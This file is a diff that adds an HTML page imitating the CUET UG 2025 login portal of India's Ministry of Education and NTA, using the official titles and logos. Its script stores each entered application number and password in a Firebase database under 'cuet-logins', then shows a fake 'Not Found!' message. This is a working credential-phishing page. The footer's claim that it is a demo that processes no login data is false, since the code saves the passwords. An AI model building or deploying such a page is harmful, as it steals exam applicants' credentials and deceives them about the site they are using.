@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CUET UG - 2025</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f2f2f2;
+    }
+
+    .header {
+      background-color: #003366;
+      padding: 10px 20px;
+      color: white;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .header img {
+      height: 50px;
+    }
+
+    .header .title {
+      flex: 1;
+      text-align: center;
+    }
+
+    .header .title h1 {
+      margin: 0;
+      font-size: 20px;
+      font-weight: 600;
+    }
+
+    .header .title h2 {
+      margin: 2px 0 0;
+      font-size: 14px;
+      font-weight: 400;
+    }
+
+    .login-container {
+      background-color: white;
+      max-width: 600px;
+      margin: 50px auto;
+      padding: 30px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    .login-container h3 {
+      background-color: #005fa3;
+      color: white;
+      padding: 10px;
+      text-align: center;
+      font-size: 16px;
+      margin-top: 0;
+    }
+
+    .form-group {
+      margin: 15px 0;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+
+    .captcha-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .captcha-img {
+      background-color: #eef6ee;
+      padding: 10px;
+      font-weight: bold;
+      font-family: monospace;
+      border-radius: 4px;
+      color: green;
+    }
+
+    button {
+      background-color: #0072ce;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 15px;
+      border-radius: 4px;
+      width: 100%;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .footer {
+      background-color: #003366;
+      color: white;
+      padding: 10px;
+      font-size: 12px;
+      text-align: center;
+    }
+
+    .footer span {
+      display: block;
+      margin-top: 5px;
+      font-size: 11px;
+      opacity: 0.8;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <img src="https://i.ibb.co/tTq0ypTy/Untitled-design-2.png" alt="India" height="50">
+    <div class="title">
+      <h1>CUET UG - 2025</h1>
+      <h2>Department of Higher Education<br>Ministry of Education, Government of India</h2>
+    </div>
+    <img src="https://i.ibb.co/3YmP4x70/Untitled-design-1.png" alt="NTA" height="50">
+  </div>
+
+  <form id="cuetLoginForm" class="login-container">
+    <h3>Login Through Application Number & Password</h3>
+
+    <div class="form-group">
+      <label for="appno">Application No :</label>
+      <input type="text" id="appno" required>
+    </div>
+
+    <div class="form-group">
+      <label for="password">Password :</label>
+      <input type="password" id="password" required>
+    </div>
+
+    <div class="form-group">
+      <label for="captcha">Enter CAPTCHA :</label>
+      <div class="captcha-group">
+        <input type="text" id="captcha" required>
+        <div class="captcha-img" id="captchaValue">E62L62</div>
+      </div>
+    </div>
+
+    <button type="submit">SUBMIT</button>
+  </form>
+
+  <div class="footer">
+    Disclaimer: This is a demo clone for educational/testing use only. No real login data is being processed.
+    <span>Developed for demo – Version 1.0.0</span>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+    const firebaseConfig = {
+    apiKey: "AIzaSyCmDzcJExVTW2BFoQXMWSXDPMww7JsG6qc",
+    authDomain: "logintest-b939e.firebaseapp.com",
+    projectId: "logintest-b939e",
+    storageBucket: "logintest-b939e.firebasestorage.app",
+    messagingSenderId: "100538611587",
+    appId: "1:100538611587:web:b9b8b87139f12bf18568b6"
+  };
+
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    document.getElementById("cuetLoginForm").addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const appno = document.getElementById("appno").value;
+      const pass = document.getElementById("password").value;
+      const captchaInput = document.getElementById("captcha").value;
+      const captchaVal = document.getElementById("captchaValue").innerText;
+
+      if (captchaInput !== captchaVal) {
+        alert("Incorrect CAPTCHA ❌");
+        return;
+      }
+
+      const userRef = push(ref(db, "cuet-logins"));
+      set(userRef, {
+        applicationNumber: appno,
+        password: pass,
+        captcha: captchaInput
+      }).then(() => {
+        alert("Not Found!");
+        document.getElementById("cuetLoginForm").reset();
+      }).catch((error) => {
+        alert("Not Found." + error.message);
+      });
+    });
+  </script>
+
+</body>
+</html>
